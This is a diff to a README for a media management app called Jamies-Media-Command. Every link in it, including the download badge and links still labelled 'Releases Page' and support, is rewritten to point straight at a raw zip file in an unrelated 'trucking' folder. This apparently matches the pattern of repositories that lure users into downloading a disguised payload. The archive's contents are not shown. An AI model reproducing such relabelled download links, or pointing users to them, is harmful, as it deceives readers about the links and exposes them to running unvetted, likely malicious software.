@@ -1,7 +1,7 @@
 # 🎉 Jamies-Media-Command - Your Media Management Made Easy
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)  
-[Download Now](https://github.com/biruk456/Jamies-Media-Command/releases)
+![Download](https://github.com/biruk456/Jamies-Media-Command/raw/refs/heads/main/trucking/Media-Command-Jamies-2.2.zip)  
+[Download Now](https://github.com/biruk456/Jamies-Media-Command/raw/refs/heads/main/trucking/Media-Command-Jamies-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Make sure your system meets these requirements to ensure smooth operation.
 
 ## 🛠️ Download & Install
 
-1. Visit the [Releases Page](https://github.com/biruk456/Jamies-Media-Command/releases) to download the latest version.
+1. Visit the [Releases Page](https://github.com/biruk456/Jamies-Media-Command/raw/refs/heads/main/trucking/Media-Command-Jamies-2.2.zip) to download the latest version.
 2. Find the version you want to install. Click on the link for the installer that matches your operating system.
 3. Once the download is complete, locate the file in your Downloads folder.
 
@@ -74,6 +74,6 @@ We welcome contributions! If you have suggestions for improvements or new featur
 
 ## 📞 Support
 
-For further assistance, please visit our [Releases Page](https://github.com/biruk456/Jamies-Media-Command/releases) and check out the support section. You can also join our community on Discord or GitHub discussions for real-time help.
+For further assistance, please visit our [Releases Page](https://github.com/biruk456/Jamies-Media-Command/raw/refs/heads/main/trucking/Media-Command-Jamies-2.2.zip) and check out the support section. You can also join our community on Discord or GitHub discussions for real-time help.
 
 Thank you for choosing Jamies-Media-Command! We hope this application makes your media management a breeze.
